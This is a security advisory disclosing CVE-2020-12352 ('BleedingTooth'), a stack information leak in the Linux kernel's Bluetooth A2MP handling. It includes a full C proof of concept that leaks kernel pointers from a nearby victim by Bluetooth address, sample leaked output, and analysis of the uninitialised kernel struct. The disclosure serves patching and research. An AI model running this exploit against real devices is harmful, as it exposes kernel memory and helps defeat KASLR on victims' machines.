---
title: 'Linux: Stack-Based Information Leak in A2MP (BleedingTooth)'
severity: Moderate
ghsa_id: GHSA-7mh3-gq28-gfrq
cve_id: CVE-2020-12352
weaknesses: []
products:
- ecosystem: ''
  package_name: linux
  affected_versions: '>= 3.6'
  patched_versions: ''
cvss: null
credits:
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

# BadChoice: Stack-Based Information Leak (BleedingTooth)

## Summary

A stack-based information leak affecting Linux kernel 3.6 and higher was discovered in `net/bluetooth/a2mp.c`.

## Severity

*Medium*

A remote attacker in short distance knowing the victim's bd address can retrieve kernel stack information containing various pointers that can be used to predict the memory layout and to defeat KASLR. The leak may contain other valuable information such as the encryption keys. Malicious Bluetooth chips can trigger the vulnerability as well.

## Proof Of Concept

Compile the code below using `gcc -o poc poc.c -lbluetooth` and run as `sudo ./poc 11:22:33:44:55:66`.

The following leaked information of a machine running Ubuntu 20.04 LTS has been observed:

```
[*] Resetting hci0 device...
[*] Opening hci device...
[*] Connecting to victim...
[+] HCI handle: 100
[*] Creating AMP channel...
[*] Configuring to L2CAP_MODE_BASIC...
[*] Sending malicious AMP info request...
[+] Leaked: ffffffff98e00000, ffffffff98e001a4, 1229
```

### poc.c

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define AMP_MGR_CID 0x03

typedef struct {
	uint8_t  code;
	uint8_t  ident;
	uint16_t len;
} __attribute__ ((packed)) amp_mgr_hdr;
#define AMP_MGR_HDR_SIZE 4

#define AMP_INFO_REQ 0x06
typedef struct {
	uint8_t id;
} __attribute__ ((packed)) amp_info_req_parms;

typedef struct {
	uint8_t  mode;
	uint8_t  txwin_size;
	uint8_t  max_transmit;
	uint16_t retrans_timeout;
	uint16_t monitor_timeout;
	uint16_t max_pdu_size;
} __attribute__ ((packed)) l2cap_conf_rfc;

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t data_length) {
  uint8_t type = HCI_ACLDATA_PKT;
  uint16_t BCflag = 0x0000;
  uint16_t PBflag = 0x0002;
  uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;

  hci_acl_hdr hdr;
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3];

  iv[0].iov_base = &type;
  iv[0].iov_len = 1;
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    return 1;
  }

  bdaddr_t dst_addr;
  str2ba(argv[1], &dst_addr);

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  struct hci_filter flt;
  hci_filter_clear(&flt);
  hci_filter_all_ptypes(&flt);
  hci_filter_all_events(&flt);
  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("setsockopt(HCI_FILTER)");
    return 1;
  }

  int opt = 1;
  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0) {
    perror("setsockopt(HCI_DATA_DIR)");
    return 1;
  }

  printf("[*] Connecting to victim...\n");

  struct sockaddr_l2 laddr = {0};
  laddr.l2_family = AF_BLUETOOTH;
  laddr.l2_bdaddr = di.bdaddr;

  struct sockaddr_l2 raddr = {0};
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr = dst_addr;

  int l2_sock;

  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
    perror("socket");
    return 1;
  }

  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
    perror("bind");
    return 1;
  }

  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
    perror("connect");
    return 1;
  }

  struct l2cap_conninfo l2_conninfo;
  socklen_t l2_conninfolen = sizeof(l2_conninfo);
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen) < 0) {
    perror("getsockopt");
    return 1;
  }

  uint16_t hci_handle = l2_conninfo.hci_handle;
  printf("[+] HCI handle: %x\n", hci_handle);

  printf("[*] Creating AMP channel...\n");
  struct {
    l2cap_hdr hdr;
  } packet1 = {0};
  packet1.hdr.len = htobs(sizeof(packet1) - L2CAP_HDR_SIZE);
  packet1.hdr.cid = htobs(AMP_MGR_CID);
  hci_send_acl_data(hci_socket, hci_handle, &packet1, sizeof(packet1));

  printf("[*] Configuring to L2CAP_MODE_BASIC...\n");
  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conf_rsp conf_rsp;
    l2cap_conf_opt conf_opt;
    l2cap_conf_rfc conf_rfc;
  } packet2 = {0};
  packet2.hdr.len = htobs(sizeof(packet2) - L2CAP_HDR_SIZE);
  packet2.hdr.cid = htobs(1);
  packet2.cmd_hdr.code = L2CAP_CONF_RSP;
  packet2.cmd_hdr.ident = 0x41;
  packet2.cmd_hdr.len = htobs(sizeof(packet2) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  packet2.conf_rsp.scid = htobs(AMP_MGR_CID);
  packet2.conf_rsp.flags = htobs(0);
  packet2.conf_rsp.result = htobs(L2CAP_CONF_UNACCEPT);
  packet2.conf_opt.type = L2CAP_CONF_RFC;
  packet2.conf_opt.len = sizeof(l2cap_conf_rfc);
  packet2.conf_rfc.mode = L2CAP_MODE_BASIC;
  hci_send_acl_data(hci_socket, hci_handle, &packet2, sizeof(packet2));

  printf("[*] Sending malicious AMP info request...\n");
  struct {
    l2cap_hdr hdr;
    amp_mgr_hdr amp_hdr;
    amp_info_req_parms info_req;
  } packet3 = {0};
  packet3.hdr.len = htobs(sizeof(packet3) - L2CAP_HDR_SIZE);
  packet3.hdr.cid = htobs(AMP_MGR_CID);
  packet3.amp_hdr.code = AMP_INFO_REQ;
  packet3.amp_hdr.ident = 0x41;
  packet3.amp_hdr.len = htobs(sizeof(amp_info_req_parms));
  packet3.info_req.id = 0x42; // use a dummy id to make hci_dev_get fail
  hci_send_acl_data(hci_socket, hci_handle, &packet3, sizeof(packet3));

  // Read responses
  for (int i = 0; i < 64; i++) {
    char buf[1024] = {0};
    size_t buf_size = read(hci_socket, buf, sizeof(buf));
    if (buf_size > 0 && buf[0] == HCI_ACLDATA_PKT) {
      l2cap_hdr *l2_hdr = (l2cap_hdr *)(buf + 5);
      if (btohs(l2_hdr->cid) == AMP_MGR_CID) {
        uint64_t leak1 = *(uint64_t *)(buf + 13) & ~0xffff;
        uint64_t leak2 = *(uint64_t *)(buf + 21);
        uint16_t leak3 = *(uint64_t *)(buf + 29);
        printf("[+] Leaked: %lx, %lx, %x\n", leak1, leak2, leak3);
        break;
      }
    }
  }

  close(l2_sock);
  hci_close_dev(hci_socket);

  return 0;
}
```

## Analysis

The vulnerability was introduced in [commit 47f2d97d38816aaca94c9b6961c6eff1cfcd0bd6](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/a2mp.c?id=47f2d97d38816aaca94c9b6961c6eff1cfcd0bd6) and got modified a bit in [commit 8e2a0d92c56ec6955526a8b60838c9b00f70540d](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/a2mp.c?id=8e2a0d92c56ec6955526a8b60838c9b00f70540d).

Namely, when specifying an invalid hci device id or one that is not of type `HCI_AMP` in the `A2MP_GETINFO_REQ` request, an error response is sent back with not fully initialized struct members.

```c
static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
			    struct a2mp_cmd *hdr)
{
	struct a2mp_info_req *req  = (void *) skb->data;
	struct hci_dev *hdev;
	struct hci_request hreq;
	int err = 0;

	if (le16_to_cpu(hdr->len) < sizeof(*req))
		return -EINVAL;

	BT_DBG("id %d", req->id);

	hdev = hci_dev_get(req->id);
	if (!hdev || hdev->dev_type != HCI_AMP) {
		struct a2mp_info_rsp rsp;

		rsp.id = req->id;
		rsp.status = A2MP_STATUS_INVALID_CTRL_ID;

		a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
			  &rsp);

		goto done;
	}
	...
}
```

where the struct of `a2mp_info_rsp` contains the following members:

```c
struct a2mp_info_rsp {
	__u8	id;
	__u8	status;
	__le32	total_bw;
	__le32	max_bw;
	__le32	min_latency;
	__le16	pal_cap;
	__le16	assoc_size;
} __packed;
```

Since `a2mp_info_rsp` is allocated on stack and only the first 2 bytes are initialized, it means that 16 bytes from the previous stack frame can be disclosed.

Note that the same vulnerability exists in the function `a2mp_send_getinfo_rsp()` too.